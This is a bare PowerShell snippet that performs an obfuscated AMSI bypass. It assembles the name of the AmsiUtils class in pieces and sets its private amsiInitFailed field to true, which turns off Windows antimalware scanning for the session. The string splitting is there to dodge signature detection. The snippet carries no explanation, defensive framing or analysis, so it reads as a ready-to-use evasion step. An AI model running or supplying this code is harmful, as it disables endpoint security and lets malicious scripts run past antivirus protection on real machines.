$a = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';
$b = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $a,$c,$m));
$d = $b.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');
$d.SetValue($null,([string]'True').ToLower().StartsWith('t'))
